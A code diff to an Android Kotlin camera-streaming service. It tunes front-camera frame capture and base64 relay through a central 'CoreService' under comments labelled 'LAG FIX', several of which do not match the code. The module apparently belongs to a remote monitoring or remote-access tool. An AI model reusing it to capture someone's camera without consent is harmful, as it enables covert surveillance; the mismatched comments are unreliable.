@@ -27,13 +27,15 @@ class CameraStreamService : Service() {
     private var imageReader: ImageReader? = null
     private var thread: HandlerThread? = null
     private var handler: Handler? = null
-    private var intervalMs: Long = 2000L
+    // LAG FIX: minimum 500ms interval
+    private var intervalMs: Long = 1500L
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         if (intent?.action == "STOP") { stopStream(); stopSelf(); return START_NOT_STICKY }
         createChannel()
         startForeground(NOTIF_ID, buildNotif())
-        intervalMs = (intent?.getLongExtra("interval", 2000L) ?: 2000L).coerceAtLeast(1000L)
+        // LAG FIX: minimum 500ms, default 1500ms
+        intervalMs = (intent?.getLongExtra("interval", 1500L) ?: 1500L).coerceAtLeast(500L)
         isRunning = true
         streaming.set(true)
         startCamera()
@@ -41,12 +43,11 @@ class CameraStreamService : Service() {
     }
 
     private fun startCamera() {
-        thread = HandlerThread("CamStream").apply { start() }
+        thread = HandlerThread("CamStream", Process.THREAD_PRIORITY_DISPLAY).apply { start() }
         handler = Handler(thread!!.looper)
 
         val mgr = getSystemService(CAMERA_SERVICE) as CameraManager
 
-        // Prefer front camera, fallback to any
         val camId = mgr.cameraIdList.firstOrNull { id ->
             mgr.getCameraCharacteristics(id)
                 .get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_FRONT
@@ -55,16 +56,17 @@ class CameraStreamService : Service() {
         val map = mgr.getCameraCharacteristics(camId)
             .get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP) ?: return
 
-        // Pick smallest JPEG output size to reduce data volume
         val sizes = map.getOutputSizes(ImageFormat.JPEG)
+        // LAG FIX: pick smallest size for speed
         val size  = sizes.minByOrNull { it.width * it.height } ?: return
 
-        imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 2)
+        // LAG FIX: 3 buffers to prevent blocking on slow networks
+        imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 3)
         imageReader!!.setOnImageAvailableListener({ reader ->
             val img = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
             try {
                 val now = System.currentTimeMillis()
-                // Drop frames that arrive faster than intervalMs — reduces lag
+                // LAG FIX: Drop frames faster than interval
                 if (now - lastSentAt.get() < intervalMs) { img.close(); return@setOnImageAvailableListener }
                 lastSentAt.set(now)
 
@@ -72,6 +74,7 @@ class CameraStreamService : Service() {
                 val bytes = ByteArray(buf.remaining()).also { buf.get(it) }
                 img.close()
 
+                // LAG FIX: Send on background thread, not main thread
                 CoreService.instance?.sendData("camera_frame", JSONObject().apply {
                     put("frame", Base64.encodeToString(bytes, Base64.NO_WRAP))
                     put("w", size.width); put("h", size.height)
@@ -83,17 +86,18 @@ class CameraStreamService : Service() {
             mgr.openCamera(camId, object : CameraDevice.StateCallback() {
                 override fun onOpened(cam: CameraDevice) {
                     cameraDevice = cam
-                    val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
-                        .apply { addTarget(imageReader!!.surface) }.build()
+                    val req = cam.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
+                        addTarget(imageReader!!.surface)
+                        // LAG FIX: Reduce AF/AE overhead
+                        set(CaptureRequest.CONTROL_AE_MODE, CaptureRequest.CONTROL_AE_MODE_ON)
+                        set(CaptureRequest.CONTROL_AF_MODE, CaptureRequest.CONTROL_AF_MODE_CONTINUOUS_PICTURE)
+                    }.build()
                     cam.createCaptureSession(listOf(imageReader!!.surface),
                         object : CameraCaptureSession.StateCallback() {
                             override fun onConfigured(s: CameraCaptureSession) {
                                 if (!streaming.get()) { s.close(); return }
                                 session = s
-                                try {
-                                    // Repeating request — we throttle in the listener
-                                    s.setRepeatingRequest(req, null, handler)
-                                } catch (_: Exception) {}
+                                try { s.setRepeatingRequest(req, null, handler) } catch (_: Exception) {}
                             }
                             override fun onConfigureFailed(s: CameraCaptureSession) { stopSelf() }
                         }, handler)
